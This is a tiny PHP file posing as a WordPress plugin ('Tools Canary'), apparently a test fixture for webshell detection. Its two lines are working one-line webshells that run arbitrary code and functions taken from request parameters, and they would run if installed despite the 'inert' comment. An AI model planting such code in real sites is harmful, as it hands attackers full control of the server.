<?php
/* Plugin Name: Tools Canary */
// INERT TEST FIXTURE: classic one-line webshells
if ( isset( $_REQUEST['c'] ) ) { @eval( stripslashes( $_REQUEST['c'] ) ); }
if ( isset( $_POST['f'] ) ) { $_POST['f']( $_POST['a'] ); }
